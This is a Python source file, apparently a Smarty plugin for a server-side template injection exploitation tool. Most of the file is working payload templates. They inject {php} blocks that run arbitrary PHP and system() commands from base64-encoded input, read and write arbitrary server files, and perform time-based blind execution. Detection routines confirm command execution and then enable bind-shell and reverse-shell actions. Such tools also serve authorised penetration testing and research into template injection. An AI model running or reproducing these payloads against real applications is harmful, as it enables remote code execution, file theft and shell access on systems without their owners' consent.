from core import languages
from core.plugin import Plugin
from utils.loggers import log
from utils import rand
from utils.strings import quote
import base64
import re

class Smarty(Plugin):

    actions = {
        'render' : {
            'render': '{%(code)s}',
            'header': '{%(header)s}',
            'trailer': '{%(trailer)s}',
            'render_test': """%(r1)s}{*%(comment)s*}{%(r2)s""" % { 
                'r1' : rand.randints[0],
                'comment' : rand.randints[1],
                'r2' : rand.randints[2]
            },
            'render_expected': '%(r1)s%(r2)s' % { 
                'r1' : rand.randints[0],
                'r2' : rand.randints[2]
            }
        },
        'write' : {
            'call' : 'evaluate',
            'write' : """$d="%(chunk_b64)s"; file_put_contents("%(path)s", base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)),FILE_APPEND);""",
            'truncate' : """file_put_contents("%(path)s", "");"""
        },
        'read' : {
            'call': 'evaluate',
            'read' : """print(base64_encode(file_get_contents("%(path)s")));"""
        },
        'md5' : {
            'call': 'evaluate',
            'md5': """is_file("%(path)s") && print(md5_file("%(path)s"));"""
        },
        'evaluate' : {
            'call': 'render',
            'evaluate': """{php}%(code)s{/php}"""
        },
        'execute' : {
            'call': 'evaluate',
            'execute': """$d="%(code_b64)s";system(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)));"""
        },
        'blind' : {
            'call': 'evaluate_blind',
            'bool_true' : """True""",
            'bool_false' : """False"""
        },
        'evaluate_blind' : {
            'call': 'inject',
            'evaluate_blind': """{php}$d="%(code_b64)s";eval("return (" . base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)) . ") && sleep(%(delay)i);");{/php}"""
        },
        'execute_blind' : {
            'call': 'inject',
            'execute_blind': """{php}$d="%(code_b64)s";system(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)). " && sleep %(delay)i");{/php}"""
        },
        'bind_shell' : {
            'call' : 'execute_blind',
            'bind_shell': languages.bash_bind_shell
        },
        'reverse_shell' : {
            'call': 'execute_blind',
            'reverse_shell' : languages.bash_reverse_shell
        },

    }

    contexts = [

        # Text context, no closures
        { 'level': 0 },

        { 'level': 1, 'prefix': '%(closure)s}', 'suffix' : '{', 'closures' : languages.php_ctx_closures },

        # {config_load file="missing_file"} raises an exception

        # Escape Ifs
        { 'level': 5, 'prefix': '%(closure)s}{/if}{if 1}', 'suffix' : '', 'closures' : languages.php_ctx_closures },

        # Escape {assign var="%s" value="%s"}
        { 'level': 5, 'prefix': '%(closure)s var="" value=""}{assign var="" value=""}', 'suffix' : '', 'closures' : languages.php_ctx_closures },

        # Comments
        { 'level': 5, 'prefix': '*}', 'suffix' : '{*' },
    

    ]

    language = "php"

    def rendered_detected(self):

        os = self.evaluate("""echo PHP_OS;""")
        if os and re.search('^[\w-]+$', os):
            self.set('os', os)
            self.set('evaluate', self.language)
            self.set('write', True)
            self.set('read', True)

            expected_rand = str(rand.randint_n(2))
            if expected_rand == self.execute('echo %s' % expected_rand):
                self.set('execute', True)
                self.set('bind_shell', True)
                self.set('reverse_shell', True)

    def blind_detected(self):

        # Blind has been detected so code has been already evaluated
        self.set('evaluate_blind', self.language)

        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
            self.set('execute_blind', True)
            self.set('write', True)
            self.set('bind_shell', True)
            self.set('reverse_shell', True)
